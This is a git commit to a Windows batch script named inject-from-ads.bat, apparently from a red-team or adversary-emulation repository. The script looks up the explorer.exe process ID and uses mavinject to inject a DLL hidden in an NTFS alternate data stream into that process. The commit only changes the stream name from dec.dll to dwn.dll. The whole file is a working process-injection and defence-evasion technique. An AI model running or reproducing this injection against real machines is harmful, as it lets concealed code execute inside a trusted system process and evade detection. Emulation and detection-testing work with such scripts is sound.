3efa1aabd1d3e1e8492bc6fdf6c4db6ff8308377
RT-KT <austinjs1213@gmail.com>
2019-12-30 12:11:55 -0800

    Update inject-from-ads.bat

--- inject-from-ads.bat
+++ inject-from-ads.bat
@@ -1,2 +1,2 @@
 for /f "TOKENS=1" %a in ('wmic PROCESS where "Name='explorer.exe'" get ProcessID ^| findstr [0-9]') do set ExpPID=%a
-mavinject %ExpPID% /INJECTRUNNING C:\Users\Public\sysinfo.inf:dec.dll
+mavinject %ExpPID% /INJECTRUNNING C:\Users\Public\sysinfo.inf:dwn.dll
